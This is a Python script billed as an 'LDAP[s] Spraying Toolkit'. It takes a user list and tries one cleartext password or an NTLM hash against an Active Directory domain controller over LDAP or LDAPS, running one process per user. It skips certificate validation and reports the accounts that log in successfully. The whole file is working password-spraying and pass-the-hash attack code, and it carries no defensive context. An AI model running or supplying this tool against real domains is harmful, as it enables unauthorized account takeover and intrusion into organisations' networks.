#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
import ldap3
import argparse
import logging
import sys
import string
import random
import ssl
import os
from binascii import unhexlify
import multiprocessing
import socket


def login(username, password, domain, hashes, dc_ip, port):
    if port == 389:
        user = '%s\\%s' % (domain, username)
        try:
            ldapServer = ldap3.Server(dc_ip, port=port, get_info=ldap3.ALL)
            if hashes is not None:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=hashes, authentication=ldap3.NTLM)
                if ldapConn.bind():
                    print("[+]Success %s/%s" % (domain, username) )
            else:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=password, authentication=ldap3.NTLM)
                if ldapConn.bind():
                    print("[+]Success %s/%s" % (domain, username) )
        except socket.error:
            print("[-]Could not connect to dc")
            return
    else:
        user = '%s\\%s' % (domain, username)
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
        try:
            ldapServer = ldap3.Server(dc_ip, use_ssl=True, port=port, get_info=ldap3.ALL, tls=tls)
            if hashes is not None:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=hashes, authentication=ldap3.NTLM)
                if ldapConn.bind():
                    print("[+]Success %s/%s" % (domain, username) )
            else:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=password, authentication=ldap3.NTLM)
                if ldapConn.bind():
                    print("[+]Success %s/%s" % (domain, username) )
        except ldap3.core.exceptions.LDAPSocketOpenError:
            #try tlsv1
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1)
            ldapServer = ldap3.Server(dc_ip, use_ssl=True, port=port, get_info=ldap3.ALL, tls=tls)
            if hashes is not None:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=hashes, authentication=ldap3.NTLM)
                if ldapConn.bind():
                    print("[+]Success %s/%s" % (domain, username) )
            else:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=password, authentication=ldap3.NTLM)
                if ldapConn.bind():
                    print("[+]Success %s/%s" % (domain, username) )
        except socket.error as e:
            print("[-]Could not connect to dc")
            return


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "LDAP[s] Spraying Toolkit")
    
    group = parser.add_argument_group('authentication')
    group.add_argument('-userlist', action='store', metavar = "userlist", help='List of users to spray, format is [[domain/]username')
    group.add_argument('-password', action="store", metavar = "password", help='Clear-text password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    
    group = parser.add_argument_group('connection')
    group.add_argument('-domain', action='store', metavar="domain",
                       help='FQDN of the target domain')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    parser.add_argument('-port', type=int, choices=[389, 636],
                       help='Destination port to connect to. LDAP defaults to 389, LDAPS to 636.')



    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    
    options = parser.parse_args()

    if options.password is None and options.hashes is None:
        parser.print_help()
        sys.exit(1)
    
    if options.userlist is None:
        parser.print_help()
        sys.exit(1)

    if options.dc_ip is None:
        parser.print_help()
        sys.exit(1)

    hashes = options.hashes
    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
        if not lmhash:
            lm = 'aad3b435b51404eeaad3b435b51404ee'
            hashes = lm + ":" + nthash
    
    if options.password is None:
        password = ''
    else:
        password = options.password
    
    if options.port is None:
        port = 389
    else:
        port = options.port
    
    #threading
    jobs = []

    with open(options.userlist, 'r') as users:
        for _user in users.readlines():
            domain = options.domain
            try:
                domain, user = _user.split("/")
            except:
                user = _user

            process = multiprocessing.Process(target=login,
                args=(user.strip(), password, domain, hashes, options.dc_ip, port))
            jobs.append(process)

    # Start the processes
    for j in jobs:
        j.start()

    # Ensure all of the processes have finished
    for j in jobs:
        j.join()    

if __name__ == "__main__":
    main()